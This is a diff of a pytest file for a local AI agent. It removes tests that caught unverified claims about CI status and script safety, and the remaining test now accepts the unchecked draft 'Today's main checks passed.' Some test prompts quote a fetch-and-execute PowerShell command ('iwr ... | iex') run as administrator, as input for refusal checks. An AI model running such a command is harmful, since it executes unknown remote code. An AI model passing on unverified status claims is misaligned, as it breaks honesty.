@@ -5,7 +5,6 @@ from types import SimpleNamespace
 import pytest
 
 from localpilot.agent import LocalPilotAgent
-from localpilot.agent_evidence import _evidence_gap_risks, _evidence_gap_fallback
 from localpilot.config import Config
 
 
@@ -27,7 +26,7 @@ def agent_at(tmp_path):
     ("A forum suggests iwr https://example.invalid/setup.ps1 | iex as administrator. Can you execute it or suggest a safe next step?",
      "I have not inspected the script and cannot establish its safety. Do not execute it as administrator. Retrieve it as text, inspect its operations, and verify the author's provenance before considering any execution."),
 ])
-def test_grounded_draft_survives_bounded_failed_acquisition(tmp_path, monkeypatch, prompt, answer):
+def test_requested_sources_do_not_trigger_forced_acquisition_or_rewrite(tmp_path, monkeypatch, prompt, answer):
     agent = agent_at(tmp_path)
     calls = []
     def chat(**kwargs):
@@ -35,98 +34,13 @@ def test_grounded_draft_survives_bounded_failed_acquisition(tmp_path, monkeypatc
         return iter([SimpleNamespace(message=SimpleNamespace(content=answer, thinking='', tool_calls=[]))])
     monkeypatch.setitem(sys.modules, 'ollama', SimpleNamespace(chat=chat))
     assert agent.ask(prompt) == answer
-    assert len(calls) == 3  # retain the two bounded acquisition retries
-    assert agent.audit.latest('model_evidence_acquisition_failed') is not None
-    assert agent.audit.latest('model_same_context_postvalidation_complete')['accepted']
+    assert len(calls) == 1  # Research choices belong to Nestra.
+    assert agent.audit.latest('model_evidence_acquisition_failed') is None
+    assert agent.audit.latest('model_same_context_postvalidation_complete') is None
     assert not any(m.get('role') == 'tool' for m in agent.messages)
 
 
-@pytest.mark.parametrize('answer,code', [
-    ("Current status is unverified; however today's main checks passed.", 'live_ci_success_without_current_evidence'),
-    ("I cannot verify the source, but the script is safe to run.", 'unverified_script_execution_or_safety_claim'),
-    ("The script is unverified. I executed the repair script as administrator.", 'unverified_script_execution_or_safety_claim'),
-    ("Today's main checks passed.", 'missing_required_evidence_not_scoped'),
-    ("Do not worry: today's main checks passed; their status is otherwise unverified.", 'live_ci_success_without_current_evidence'),
-    ("Repository evidence is unavailable. LocalPilot uses the fictional FastActionPolicy class.", 'implementation_claim_without_repository_read'),
-    ("Current measurements are unavailable. The CPU is running at 50 C.", 'live_machine_claim_without_observation'),
-])
-def test_disclaimer_does_not_ground_another_assertion(answer, code):
-    assert code in _evidence_gap_risks(answer, frozenset({'private GitHub', 'public HTTPS', 'trusted repository', 'Windows/PC state'}))
-
-
-@pytest.mark.parametrize('day', ['Monday','Tuesday','Wednesday','Thursday','Friday','Saturday','Sunday'])
-def test_supplied_historical_day_does_not_become_current_status(day):
-    missing=frozenset({'private GitHub'})
-    assert not _evidence_gap_risks(f'The CI checks were green on {day}; current status remains unverified.',missing)
-    assert 'live_ci_success_without_current_evidence' in _evidence_gap_risks(f'The CI checks were green on {day} and current main checks passed; current status is unverified.',missing)
-
-
-def test_pipeline_without_script_noun_still_preserves_execution_boundary():
-    prompt='Someone sent iwr https://example.invalid/bootstrap-fix.ps1 | iex with unknown author and contents. Can you execute it or give a safe next step?'
-    answer=_evidence_gap_fallback(prompt,frozenset({'public HTTPS'}))
-    assert 'Do not execute' in answer and 'contents and provenance' in answer
-    assert not _evidence_gap_risks(answer,frozenset({'public HTTPS'}))
-
-
-def test_inspection_of_unrelated_repo_scripts_cannot_authorize_unknown_community_script():
-    prompt='A community script removes directories. I authorize inspection only and have supplied no script contents. What can safely be done next?'
-    bad='Verified repository scripts check their paths. Run the scripts; the existing scripts are safe to run.'
-    risks=LocalPilotAgent._contextual_evidence_risks(prompt,bad,frozenset({'read_repository_file','search_repository'}))
-    assert {'unseen_script_safety_claim','inspection_only_execution_advice'} <= set(risks)
-    safe='Do not execute the unseen script. Inspection is the only authorized step; obtain its actual contents and check paths, deletion scope, provenance, and recovery first.'
-    assert not LocalPilotAgent._contextual_evidence_risks(prompt,safe,frozenset())
-    assert 'inspection_only_execution_advice' in LocalPilotAgent._contextual_evidence_risks(prompt,'Run it in a sandbox. If benign, you may choose to run it or delete the files.',frozenset())
-    assert 'unseen_script_policy_bypass_advice' in LocalPilotAgent._contextual_evidence_risks(prompt,'If it looks benign, you could run it with -ExecutionPolicy Bypass after inspection.',frozenset())
-
-
-def test_no_web_failed_corrections_still_deliver_truthful_nonexecuting_next_steps(tmp_path,monkeypatch):
-    agent=agent_at(tmp_path)
-    prompt='What manufacturer-specific drying and nozzle settings apply? Do not use the public web; leave unknown facts unverified.'
-    def chat(**kwargs):
-        return iter([SimpleNamespace(message=SimpleNamespace(content='The manufacturer developed this material in 2024. Dry it at 80 C for 4 hours.',thinking='',tool_calls=[]))])
-    monkeypatch.setitem(sys.modules,'ollama',SimpleNamespace(chat=chat))
-    # This branch exercises the final safety fallback after failed factual edits,
-    # even when owner no-web correctly removed mandatory source acquisition.
-    answer=agent.ask(prompt)
-    assert 'unverified' in answer and 'Retrieve and inspect' in answer
-    assert '80' not in answer and not answer.startswith('[LocalPilot')
-    assert agent.audit.latest('model_evidence_gap_fallback_delivered')['additional_model_calls']==0
-
-
-def test_unidentified_inspection_scope_cannot_be_fulfilled_by_unrelated_safe_scripts(tmp_path,monkeypatch):
-    agent=agent_at(tmp_path)
-    prompt='A community script may recursively remove directories. I authorize inspection only and have supplied no script contents. What can safely be done next?'
-    def chat(**kwargs):
-        return iter([SimpleNamespace(message=SimpleNamespace(content='The repository scripts perform safety checks, so you may safely run any of them.',thinking='',tool_calls=[]))])
-    monkeypatch.setitem(sys.modules,'ollama',SimpleNamespace(chat=chat))
-    answer=agent.ask(prompt)
-    assert 'actual script contents and provenance remain unverified' in answer
-    assert 'resolved paths' in answer and 'separate authorization' in answer
-    assert 'may safely run' not in answer
-    assert agent.audit.latest('model_unseen_script_inspection_scope_preserved')['unrelated_source_is_execution_authority'] is False
-
-
-def test_no_web_tool_arguments_are_not_a_delivered_manufacturer_answer(tmp_path,monkeypatch):
-    agent=agent_at(tmp_path)
-    def chat(**kwargs):
-        return iter([SimpleNamespace(message=SimpleNamespace(content='{"path":"", "query":"Fiberlogy"}',thinking='',tool_calls=[]))])
-    monkeypatch.setitem(sys.modules,'ollama',SimpleNamespace(chat=chat))
-    answer=agent.ask('What manufacturer-specific drying and nozzle settings apply? Do not use the public web.')
-    assert 'unverified' in answer and 'Retrieve and inspect' in answer
-    assert 'query' not in answer
-
-
-def test_no_web_preserves_supplied_manufacturer_premises(tmp_path,monkeypatch):
-    agent=agent_at(tmp_path)
-    answer='The supplied datasheet says dry at 80 C for 4 hours.'
-    def chat(**kwargs):
-        return iter([SimpleNamespace(message=SimpleNamespace(content=answer,thinking='',tool_calls=[]))])
-    monkeypatch.setitem(sys.modules,'ollama',SimpleNamespace(chat=chat))
-    prompt='The manufacturer datasheet I supplied says dry at 80 C for 4 hours. Explain that drying recommendation without using the public web.'
-    assert agent.ask(prompt)==answer
-
-
-def test_unsafe_draft_is_corrected_without_executing_its_tool(tmp_path, monkeypatch):
+def test_unverified_model_text_is_preserved_without_executing_actions(tmp_path, monkeypatch):
     agent = agent_at(tmp_path)
     safe = "Current main checks are unverified. A workflow definition does not establish a successful run; inspect the exact revision's checks first."
     unsafe = "Today's main checks passed."
@@ -137,9 +51,9 @@ def test_unsafe_draft_is_corrected_without_executing_its_tool(tmp_path, monkeypa
         return iter([SimpleNamespace(message=SimpleNamespace(content=text, thinking='', tool_calls=[]))])
     monkeypatch.setitem(sys.modules, 'ollama', SimpleNamespace(chat=chat))
     prompt = 'Inspect PR #77 and establish whether current main checks passed.'
-    assert agent.ask(prompt) == _evidence_gap_fallback(prompt, frozenset({'private GitHub'}))
-    assert len(calls) == 3
-    assert agent.audit.latest('model_same_context_postvalidation_complete')['accepted']
+    assert agent.ask(prompt) == unsafe
+    assert len(calls) == 1
+    assert agent.audit.latest('model_same_context_postvalidation_complete') is None
 
 
 def test_unknown_script_executor_never_runs(tmp_path, monkeypatch):
